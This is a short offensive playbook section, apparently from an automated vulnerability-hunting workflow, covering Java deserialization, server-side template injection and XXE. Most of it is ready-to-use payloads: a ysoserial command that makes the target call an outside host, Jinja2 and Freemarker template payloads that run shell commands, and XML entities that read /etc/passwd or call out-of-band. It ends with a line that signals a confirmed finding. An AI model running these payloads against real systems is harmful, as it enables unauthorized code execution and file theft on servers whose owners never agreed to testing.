# ZDH Phase 15: Serialization, SSTI & XXE

## Phase 15 - Serialization, SSTI & XXE

**High-impact code execution vectors. Spring Boot (Java) = high-value target.**

```bash
# Java Deserialization (Spring Boot / any Java app accepting serialized objects)
# Look for endpoints accepting:
# Content-Type: application/x-java-serialized-object
# Content-Type: application/octet-stream with binary data starting with "aced 0005"
# Parameters named: object=, data=, payload=, serialized=

# Generate payload (requires ysoserial):
java -jar ysoserial.jar CommonsCollections6 "curl https://your-interactsh-url" | base64

# Server-Side Template Injection (SSTI)
# Test any field that appears reflected in response (name, message, subject)
# Payload ladder - try in order:
{{7*7}}          # Jinja2/Twig -> shows "49"
${7*7}           # Freemarker/Velocity -> shows "49"
<%= 7*7 %>       # ERB (Ruby) -> shows "49"
#{7*7}           # Ruby string interpolation
*{7*7}           # Thymeleaf (Spring) -> shows "49"

# If {{7*7}} -> 49 (Jinja2): escalate to RCE:
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}

# If ${7*7} -> 49 (Freemarker): escalate to RCE:
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# XXE (XML External Entity)
# Trigger: any XML file upload, SOAP endpoint, SVG upload, Excel/DOCX upload
# Payload:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>

# OOB XXE (blind, for WAF bypass):
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://your-interactsh-url/?x=">]>

# SVG XXE (upload as image):
<svg xmlns="http://www.w3.org/2000/svg">
<image href="file:///etc/passwd"/>
</svg>
```

**Signal:** `emit_signal VULN_CONFIRMED "SSTI RCE: <engine> on <endpoint> -> code execution" "main/zerodayhunt" 0.97`
